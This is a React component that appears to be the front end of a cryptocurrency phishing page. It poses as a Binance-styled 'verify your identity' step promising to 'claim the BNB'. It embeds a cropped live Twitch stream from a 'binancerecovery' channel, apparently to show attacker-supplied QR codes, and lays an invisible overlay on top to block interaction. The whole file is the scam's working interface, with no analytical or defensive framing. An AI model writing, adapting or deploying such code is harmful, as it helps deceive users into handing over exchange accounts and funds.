import React, { useState, useEffect } from 'react';
import { Key } from 'lucide-react';

export function VerificationScreen() {
  const [hostname, setHostname] = useState('');
  const [embedError, setEmbedError] = useState(false);

  useEffect(() => {
    setHostname(typeof window !== 'undefined' ? window.location.hostname : '');
  }, []);

  if (!hostname) {
    return null;
  }

  return (
    <div className="text-center space-y-6">
      <div className="flex flex-col items-center">
        <div className="rounded-full bg-[#F0B90B]/10 p-3 mb-4">
          <Key className="h-6 w-6 text-[#F0B90B]" />
        </div>
        <h3 className="text-xl font-medium text-white mb-2">
          Scan to Verify Your Identity
        </h3>
        <div className="space-y-2">
          <p className="text-gray-300 text-sm">
            Open your phone's camera app and scan the QR code below
          </p>
          <p className="text-gray-400 text-sm">
            Please open this page on a computer to claim the BNB
          </p>
        </div>
      </div>

      <div className="relative w-full pb-[120%] rounded-lg overflow-hidden bg-[#10171c]">
        {embedError ? (
          <div className="absolute inset-0 flex items-center justify-center text-gray-400">
            Unable to load verification code
          </div>
        ) : (
          <>
            <iframe
              className="absolute inset-0"
              src={`https://player.twitch.tv/?channel=binancerecovery&parent=${hostname}`}
              height="100%"
              width="100%"
              allowFullScreen
              onError={() => setEmbedError(true)}
            />
            <div 
              className="absolute inset-0 pointer-events-none"
              style={{
                borderWidth: '125px 85px',
                borderStyle: 'solid',
                borderColor: '#10171c'
              }}
            />
            {/* Invisible overlay to prevent interaction */}
            <div className="absolute inset-0 z-10" />
          </>
        )}
      </div>
    </div>
  );
}
